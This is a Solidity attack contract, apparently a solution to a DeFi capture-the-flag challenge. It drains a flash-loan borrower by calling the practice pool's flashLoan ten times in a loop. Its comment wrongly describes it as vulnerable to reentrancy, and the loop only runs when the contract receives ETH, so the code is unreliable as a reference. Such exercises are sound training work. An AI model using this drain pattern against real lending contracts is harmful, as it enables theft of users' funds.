// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import "./NaiveReceiverLenderPool.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

/**
 * @title Attack
 * @notice This contract is vulnerable to a reentrancy attack
 */
contract Attack {
    NaiveReceiverLenderPool public pool;
    IERC3156FlashBorrower public borrower;
    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    uint256 private constant LOAN_AMOUNT = 10 ether;
    bytes public data;

    constructor(NaiveReceiverLenderPool _pool) {
        pool = _pool;
    }

    function getBorrower(IERC3156FlashBorrower _borrower) public {
        borrower = _borrower;
    }

    function getPool(NaiveReceiverLenderPool _pool) public {
        pool = _pool;
    }

    receive() external payable {
        for (uint256 i = 0; i < 10; i++) {
            pool.flashLoan(borrower, ETH, LOAN_AMOUNT, data);
        }
    }
}
